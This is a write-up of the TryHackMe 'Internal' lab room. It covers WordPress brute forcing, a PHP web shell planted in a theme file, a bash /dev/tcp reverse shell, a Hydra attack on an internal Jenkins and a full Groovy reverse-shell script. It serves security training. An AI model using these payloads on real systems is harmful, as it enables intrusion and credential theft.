# TryHackMe: Internal Write-up

<img width="1885" height="417" alt="image" src="https://github.com/user-attachments/assets/6e838b77-aec7-49aa-b6e7-43e90464faee" />

## Introduction

Internal is a Linux-based TryHackMe room that focuses on web enumeration, WordPress exploitation, credential discovery, pivoting into an internal service, and privilege escalation.

The room starts with a public-facing web application and slowly leads into internal-only services. The main lesson from this room is to keep enumerating after every new shell, because each stage gives a clue for the next one.

---

To make it more convenient, I added it the target ip to `/etc/hosts` and put the hostname as `internal.thm`

```bash
sudo nano /etc/hosts
```

## Reconnaissance

I started with an Nmap scan to identify open ports and running services on the target machine.

```bash
nmap -sC -sV -oN nmap.txt internal.thm
```
<img width="1339" height="437" alt="image" src="https://github.com/user-attachments/assets/10f0be86-80ed-4585-afa3-e2a61beab757" />

The open ports were:

```text
22/tcp  SSH
80/tcp  HTTP
```

Opening `http://internal.thm` initially displayed the default Apache2 Ubuntu page. This confirmed that the HTTP service was running, but the default page did not contain anything useful by itself. Because of that, I continued with directory enumeration to look for hidden web content.

```
gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
<img width="1132" height="134" alt="image" src="https://github.com/user-attachments/assets/bd413874-40df-4165-a1b8-9e7712c9c605" />

The most interesting result was `/blog`
```
http://internal.thm/blog/
```
<img width="1381" height="855" alt="image" src="https://github.com/user-attachments/assets/715c565a-24ea-4200-be39-a2c25cc6a72e" />

After checking the `/blog` directory, I confirmed that the site was running WordPress.

## WordPress Enumeration with WPScan

I used WPScan to enumerate WordPress-specific information such as users, themes, plugins, and exposed files.

```bash
wpscan --url http://internal.thm/blog/ -e u
```
<img width="1353" height="497" alt="image" src="https://github.com/user-attachments/assets/33d08e29-46aa-444f-96d7-91cb4979bde9" />

WPScan identified a valid WordPress username:

<img width="1349" height="467" alt="image" src="https://github.com/user-attachments/assets/3385b07a-3bbd-4d22-b185-5893ab6d67c9" />

```text
admin
```

Finding a valid username was important because it reduced the login attack from guessing both username and password to only guessing the password for the `admin` account.

I then performed a password attack against the WordPress login using the discovered username and a wordlist. To avoid running the full rockyou.txt wordlist immediately, I first created a smaller password list using the top 5000 entries.

```
head -n 5000 /usr/share/wordlists/rockyou.txt > top5k.txt
```

```
wpscan --url http://internal.thm/blog/ \
  -U admin \
  -P top5k.txt \
  --password-attack xmlrpc \
  -t 30
```

<img width="1358" height="391" alt="image" src="https://github.com/user-attachments/assets/a5e152bf-cbbc-4c40-97a7-3be239007a35" />

With the password I got for `admin`, I was able to log in to the WordPress admin dashboard at:

```text
http://internal.thm/blog/wp-login.php
```

This gave access to the WordPress backend, which became the next step toward getting command execution on the target.

## WordPress Theme Editor to Command Execution

```text
http://internal.thm/blog/wp-login.php
```
<img width="1324" height="661" alt="image" src="https://github.com/user-attachments/assets/289a197e-8983-4cff-b0e5-c71eab306bfd" />

<img width="1913" height="860" alt="image" src="https://github.com/user-attachments/assets/8e5932c5-cb97-4504-9796-e4d61234e6e9" />

Inside the WordPress admin panel, I checked the available functionality and found that the theme files could be edited through the Theme Editor.

```text
Appearance → Theme Editor
```

The active theme was `twentyseventeen`, and I edited the `404.php` template file.

To test command execution, I added a simple PHP payload:

```php
<?php system($_GET['cmd']); ?>
```

<img width="1916" height="867" alt="image" src="https://github.com/user-attachments/assets/b1d27d5a-af46-4499-9305-b6e30ac0429c" />

After saving the file, I triggered the payload from the browser:

```text
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php?cmd=id
```
<img width="1907" height="167" alt="image" src="https://github.com/user-attachments/assets/d0532275-d236-47d0-9b75-029bf3d5d984" />

The command executed successfully, confirming that I had remote command execution through the modified WordPress theme file.

```uid=33(www-data) gid=33(www-data) groups=33(www-data)```

Then after this section, we write the **reverse shell as www-data** part.

## Reverse Shell as www-data

After confirming command execution through the modified `404.php` file, I used it to get a reverse shell.

First, I started a listener on my Kali machine:

```bash
penelope -p 4444
```

Then I triggered a Bash reverse shell through the `cmd` parameter:

```text
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php?cmd=bash -c 'bash -i >& /dev/tcp/<YOUR_VPN_IP>/4444 0>&1'
```

<img width="1356" height="359" alt="image" src="https://github.com/user-attachments/assets/406ea7a3-62f1-4a97-bddc-6c0dd212bae5" />

In the browser, some characters were URL encoded, but the payload still executed the same Bash reverse shell command.

Once the request was sent, I received a connection back on my listener.

<img width="1345" height="314" alt="image" src="https://github.com/user-attachments/assets/8468c9b3-2ca5-427e-9434-c99550476aa5" />

This gave me an initial foothold on the target as the web server user.

Since the foothold came from WordPress, I checked the WordPress configuration file for database credentials.

```bash
cat /var/www/html/blog/wp-config.php
```
<img width="1348" height="354" alt="image" src="https://github.com/user-attachments/assets/9e75e271-21b5-4f1b-a62e-ef438eab98cb" />

<img width="1357" height="408" alt="image" src="https://github.com/user-attachments/assets/771618a1-da01-4f04-990f-00a70a96117b" />

The `wp-config.php` file contained MySQL credentials, which confirmed that WordPress was connected to a local database. I also checked common directories for interesting files.

Using these credentials, I logged into MySQL and inspected the WordPress database.
```
mysql -u <DB_USER> -p <DB_PASS>
```
Inside MySQL, I listed the databases and selected the WordPress database.

<img width="1348" height="756" alt="image" src="https://github.com/user-attachments/assets/e7ca19af-1d51-4ed1-a547-c906c1d2b7d9" />

<img width="1351" height="455" alt="image" src="https://github.com/user-attachments/assets/d0d56bef-4f68-46bf-8ac1-40c90413bbdd" />

Although this confirmed the WordPress user information, it did not give me a useful path forward because I already had WordPress admin access. Since the database did not provide a new privilege escalation path, I continued local enumeration on the filesystem.

The /opt directory contained an interesting file:

<img width="1342" height="265" alt="image" src="https://github.com/user-attachments/assets/2a50384d-2d62-4207-992a-269959c62477" />

I tested the credentials by connecting over SSH:
```
ssh aubreanna@internal.thm
```
The login was successful, giving me a proper shell as aubreanna.

After logging in, I checked the home directory:

<img width="1340" height="571" alt="image" src="https://github.com/user-attachments/assets/69904fb0-a46c-447f-ae7d-d7c14e59a988" />

This user.txt revealed the user flag.

In the same folder there is another file: `jenkins.txt`

<img width="756" height="64" alt="image" src="https://github.com/user-attachments/assets/9c55ad61-72f5-47f9-b298-9bfbb0786716" />

The file revealed that an internal Jenkins service was running on:

`172.17.0.2:8080`

This was an important clue because Jenkins was not exposed directly to the outside. The 172.17.0.0/16 address range is commonly used by Docker networks, which suggested that Jenkins was running inside a container or internal network.

Since this address was not directly reachable from my Kali machine, I used SSH local port forwarding through the aubreanna account.
```
ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm
```
<img width="1343" height="727" alt="image" src="https://github.com/user-attachments/assets/bc9ee272-1415-44ed-b359-0f7c37f5420b" />

This mapped my local port 8080 to the internal Jenkins service. After starting the tunnel, I opened Jenkins from my browser:
```
http://127.0.0.1:8080
```

<img width="1385" height="644" alt="image" src="https://github.com/user-attachments/assets/d900c58c-caa8-4838-b1e3-761c68d3217d" />

The Jenkins login page loaded successfully, confirming that the tunnel was working.

To understand the login request, I captured a failed login attempt in Burp Suite. At first, I had some issues capturing the Jenkins login request through my normal browser proxy setup, likely because of proxy configuration and localhost traffic. To avoid wasting time on browser proxy troubleshooting, I used Burp Suite’s built-in browser instead. Then I submitted a failed Jenkins login attempt and captured the POST request:

```
POST /j_acegi_security_check
Host: 127.0.0.1:8080
```
<img width="1573" height="589" alt="image" src="https://github.com/user-attachments/assets/dd2f1e2e-b43e-4e2d-a774-ab899f2c8cd0" />

The request body contained the username and password parameters: `j_username=admin&j_password=admin&from=&Submit=Sign+In`

<img width="590" height="548" alt="image" src="https://github.com/user-attachments/assets/371a5d61-915d-46ee-bc38-6fd041f24067" />

Using this information, I created a Hydra command to brute force the Jenkins login for the admin user.
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=Sign+In:F=loginError" -V -f -I
```
Hydra found valid credentials for the Jenkins admin account.

<img width="1341" height="212" alt="image" src="https://github.com/user-attachments/assets/396514a6-caa1-4fed-b33c-04670acf964e" />

With these credentials, I was able to log in to the Jenkins dashboard as an administrator.

<img width="1913" height="855" alt="image" src="https://github.com/user-attachments/assets/e99c363e-d0ac-4047-9240-b557784cddf2" />

As an administrator, I had access to the Jenkins Script Console, which allows Groovy scripts to be executed on the Jenkins server.

The Script Console can be accessed from:

<img width="1901" height="859" alt="image" src="https://github.com/user-attachments/assets/e568fbca-791a-43af-949a-6e02e501a7f9" />

Before running the payload, I started a listener on my Kali machine. I used Penelope because it provides a cleaner interactive shell.

```bash
penelope -p 4445
```

Then I executed a Groovy reverse shell from the Jenkins Script Console . 

```groovy
String host="<YOUR_VPN_IP>";
int port=4445;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(), so=s.getOutputStream();

while(!s.isClosed()) {
    while(pi.available()>0) so.write(pi.read());
    while(pe.available()>0) so.write(pe.read());
    while(si.available()>0) po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
    try {
        p.exitValue();
        break;
    } catch (Exception e) {}
}

p.destroy();
s.close();
```

<img width="1920" height="868" alt="image" src="https://github.com/user-attachments/assets/17669a6a-58fb-493d-8f83-36bd1268e857" />

After running the script, I received a reverse shell on my listener.

<img width="1345" height="271" alt="image" src="https://github.com/user-attachments/assets/ce36d61e-efeb-49c0-877d-51b0203b6606" />

Inside `/opt`, I found a file named `note.txt` which contained SSH credentials for the root user.

<img width="1338" height="316" alt="image" src="https://github.com/user-attachments/assets/ced36b19-af48-4256-be92-1c9e5d0cfaff" />

Then ssh into root and grabbed the root flag:

<img width="1339" height="165" alt="image" src="https://github.com/user-attachments/assets/394707a0-f805-456f-958d-70364fdc7d22" />

<img width="1348" height="355" alt="image" src="https://github.com/user-attachments/assets/0d475948-386e-459c-9339-3409627d89fb" />

## Attack Chain

The full attack chain for this room was:

```text
Nmap scan
→ Apache2 default page on port 80
→ Directory enumeration found /blog
→ WordPress site discovered
→ WPScan found valid username: admin
→ Password attack found WordPress admin credentials
→ Logged in to WordPress dashboard
→ Edited 404.php in the theme editor
→ Added PHP command execution payload
→ Triggered reverse shell as www-data
→ Enumerated WordPress config and MySQL database
→ Database did not provide a useful next step
→ Filesystem enumeration found /opt/wp-save.txt
→ Found credentials for aubreanna
→ SSH as aubreanna and got user.txt
→ Found jenkins.txt revealing internal Jenkins at 172.17.0.2:8080
→ Used SSH local port forwarding to access Jenkins
→ Captured Jenkins login request with Burp
→ Brute forced Jenkins admin login with Hydra
→ Logged in to Jenkins as admin
→ Used Jenkins Script Console for reverse shell
→ Got shell as jenkins inside Docker container
→ Found .dockerenv and realized Jenkins was containerized
→ Checked /opt/note.txt inside the container
→ Found root credentials
→ SSH/su as root on the main host
→ Read root.txt
```

## What I Learned

This room reinforced the importance of continuing enumeration after every new level of access. Getting WordPress admin access was not the end goal; it was only the first step toward command execution.

I also learned that WordPress configuration files can contain useful database credentials, but not every discovered credential or database will directly lead to privilege escalation. In this case, the MySQL database confirmed useful information, but the real next step came from filesystem enumeration.

The `jenkins.txt` file was an important pivot clue. It showed that Jenkins was running internally and could not be reached directly from the outside. Using SSH local port forwarding allowed me to access the internal Jenkins service through the `aubreanna` account.

I also practiced using Burp Suite to capture a login request and turn it into a Hydra brute force command. The Jenkins POST request showed the login path and parameters needed to build the correct Hydra syntax.

Another key lesson was understanding Docker context. After getting a shell from Jenkins, the `.dockerenv` file showed that I was inside a Docker container, not directly on the main host. Because of that, I focused on looking for notes and credentials inside the container instead of immediately searching for the host root flag.

Overall, this room showed a realistic chain where multiple small findings connected together: web enumeration, WordPress admin access, local credential discovery, internal service pivoting, Jenkins exploitation, and final privilege escalation through leaked root credentials.











